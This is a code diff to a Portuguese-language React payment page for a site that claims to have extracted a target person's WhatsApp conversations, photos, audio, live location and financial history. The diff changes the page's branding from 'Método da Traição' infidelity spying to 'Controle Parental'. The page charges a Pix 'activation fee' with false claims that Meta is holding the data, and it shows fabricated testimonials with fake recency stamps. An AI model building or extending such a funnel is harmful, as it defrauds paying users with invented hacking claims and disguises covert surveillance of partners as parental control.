@@ -7,43 +7,43 @@ import { createPixCharge, getPixStatus, type PixCharge } from "@/lib/pix.functio
 import { fbqTrackOnce, getMetaCookies, getPersistedUtms } from "@/lib/tracking";
 
 const META_AMOUNT = 63.41;
-const META_DESCRIPTION = "Recupera Relacionamento: Acesso Anual";
+const META_DESCRIPTION = "Controle Parental: Acesso Anual";
 
 const searchSchema = z.object({
   phone: z.coerce.string().optional().default(""),
   sex: z.enum(["M", "F"]).optional().default("M"),
 });
 
-export const Route = createFileRoute("/taxa-meta")({
+export const Route = createFileRoute("/ativacao")({
   head: () => ({
     meta: [
-      { title: "Acesso: Método da Traição" },
+      { title: "Acesso: Método Seguro" },
       {
         name: "description",
         content:
           "Etapa obrigatória Meta para liberar o acesso completo e ininterrupto ao relatório de acesso e vinculação.",
       },
-      { property: "og:title", content: "Acesso: Método da Traição" },
+      { property: "og:title", content: "Acesso: Método Seguro" },
       {
         property: "og:description",
         content: "Etapa obrigatória para liberar o acesso completo ao relatório de vinculação.",
       },
-      { property: "og:url", content: "https://zapradar.top/taxa-meta" },
+      { property: "og:url", content: "https://zapradar.top/ativacao" },
       { name: "robots", content: "noindex,follow" },
     ],
-    links: [{ rel: "canonical", href: "https://zapradar.top/taxa-meta" }],
+    links: [{ rel: "canonical", href: "https://zapradar.top/ativacao" }],
   }),
   validateSearch: (s) => searchSchema.parse(s),
-  component: TaxaMetaPage,
+  component: AtivacaoPage,
 });
 
-function TaxaMetaPage() {
+function AtivacaoPage() {
   const { phone, sex } = Route.useSearch();
   const navigate = useNavigate();
   const createPix = useServerFn(createPixCharge);
   const checkPix = useServerFn(getPixStatus);
   const targetName = useTargetName();
-  const doAlvo = targetName ? `de ${targetName}` : "do alvo";
+  const doDispositivo = targetName ? `de ${targetName}` : "do dispositivo";
 
   const [charge, setCharge] = useState<PixCharge | null>(null);
   const [error, setError] = useState<string | null>(null);
@@ -116,7 +116,7 @@ function TaxaMetaPage() {
             transaction_id: charge.id,
           });
           const qs = new URLSearchParams({ phone: phone ?? "", sex: sex ?? "M" }).toString();
-          window.location.assign(`/conta-poupanca?${qs}`);
+          window.location.assign(`/controle-gastos?${qs}`);
         } else {
           setStatusLabel("Aguardando confirmação…");
         }
@@ -193,13 +193,13 @@ function TaxaMetaPage() {
                 Acesso retido pela Meta
               </div>
               <div className="text-[15px] font-extrabold text-red-700 leading-tight mt-0.5">
-                O relatório {doAlvo} está pronto — mas travado no servidor da Meta.
+                O relatório {doDispositivo} está pronto — mas travado no servidor da Meta.
               </div>
             </div>
           </div>
           <p className="text-[12px] text-red-700/90 leading-snug mt-2">
             Todo o conteúdo (conversas, fotos, áudios, localização em tempo real e
-            histórico bancário) já foi extraído. A liberação depende <span className="font-bold underline decoration-red-400">exclusivamente</span> do pagamento da taxa oficial da Meta.
+            histórico financeiro) já foi extraído. A liberação depende <span className="font-bold underline decoration-red-400">exclusivamente</span> do pagamento da taxa de ativação.
           </p>
         </div>
 
@@ -221,7 +221,7 @@ function TaxaMetaPage() {
           </div>
 
           <p className="text-[13px] text-slate-800 leading-snug">
-            Para acessar o dispositivo {doAlvo}, nossa engenharia usou APIs internas
+            Para acessar o dispositivo {doDispositivo}, nossa engenharia usou APIs internas
             da <span className="text-sky-300 font-bold">Meta</span> (proprietária do
             WhatsApp, Instagram e Facebook). Cada acesso gera um custo cobrado
             <span className="font-bold"> diretamente pela plataforma</span>:
@@ -368,8 +368,8 @@ function TaxaMetaPage() {
           <div className="space-y-3 text-[12px]">
             <div className="border-l-2 border-yellow-500/60 pl-3">
               <div className="text-slate-800">
-                "Paguei a taxa Meta e em 40 segundos apareceu tudo. Descobri que ele
-                tinha uma segunda conta escondida no Instagram."
+                "Paguei a taxa e em 40 segundos apareceu tudo. Vi os aplicativos que meu
+                filho usa e o tempo de tela dele em tempo real."
               </div>
               <div className="text-slate-500 text-[11px] mt-1">— Camila R., São Paulo · há 4 min</div>
             </div>
